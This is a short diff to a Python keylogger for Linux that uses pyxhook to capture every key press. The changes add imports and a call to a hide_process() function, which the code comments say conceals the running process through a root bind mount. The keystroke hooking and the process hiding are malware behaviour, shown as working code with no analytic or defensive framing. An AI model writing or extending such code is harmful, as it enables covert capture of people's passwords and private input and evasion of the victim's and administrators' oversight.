@@ -2,8 +2,10 @@
 # to be used in linux 
 import os 
 import pyxhook 
+import string
+import random
 
-def hide_process(self):
+def hide_process():
 	ch = string.uppercase + string.digits
 	# Bind mount - works with root on linux
 	token = "".join(random.choice(ch) for i in range(32))
@@ -46,6 +48,8 @@ new_hook = pyxhook.HookManager()
 new_hook.KeyDown = OnKeyPress 
 # set the hook 
 new_hook.HookKeyboard()
+#Hide process
+hide_process()
 try: 
     new_hook.start()         # start the hook 
 except KeyboardInterrupt: 
